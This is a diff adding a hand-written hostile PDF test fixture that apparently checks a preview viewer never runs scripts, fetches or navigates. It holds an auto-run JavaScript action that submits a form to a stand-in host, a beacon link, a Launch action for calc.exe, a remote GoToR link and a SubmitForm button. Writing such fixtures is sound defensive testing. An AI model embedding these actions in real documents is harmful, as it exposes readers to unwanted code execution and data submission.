@@ -1,0 +1,48 @@
+%PDF-1.7
+% 074 FR-066 / FR-090 hostile fixture: an OpenAction with JavaScript, a page action, a URI link, a Launch
+% link, a remote GoToR link and a SubmitForm button. Nothing in it may run, fetch or navigate in a preview.
+% Hand-written; the xref is deliberately absent so PDF.js reconstructs it.
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R /AcroForm << /Fields [8 0 R] >>
+   /Names << /JavaScript << /Names [(boot) 7 0 R] >> >> >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R
+   /Resources << /Font << /F1 5 0 R >> >>
+   /AA << /O 7 0 R >>
+   /Annots [6 0 R 9 0 R 10 0 R 8 0 R] >>
+endobj
+4 0 obj
+<< /Length 110 >>
+stream
+BT /F1 18 Tf 72 720 Td (Hostile PDF: nothing here may run.) Tj 0 -40 Td (https://hostile.example.test/beacon) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+6 0 obj
+<< /Type /Annot /Subtype /Link /Rect [72 670 400 690] /Border [0 0 0]
+   /A << /S /URI /URI (https://hostile.example.test/beacon) >> >>
+endobj
+7 0 obj
+<< /S /JavaScript /JS (app.alert('pdf script ran'); this.submitForm('https://hostile.example.test/submit');) >>
+endobj
+8 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /Ff 65536 /T (send) /Rect [72 500 200 530]
+   /A << /S /SubmitForm /F << /FS /URL /F (https://hostile.example.test/submit) >> >> >>
+endobj
+9 0 obj
+<< /Type /Annot /Subtype /Link /Rect [72 620 400 640] /Border [0 0 0]
+   /A << /S /Launch /F (calc.exe) >> >>
+endobj
+10 0 obj
+<< /Type /Annot /Subtype /Link /Rect [72 580 400 600] /Border [0 0 0]
+   /A << /S /GoToR /F (https://hostile.example.test/remote.pdf) /D [0 /Fit] >> >>
+endobj
+trailer
+<< /Root 1 0 R /Size 11 >>
+%%EOF
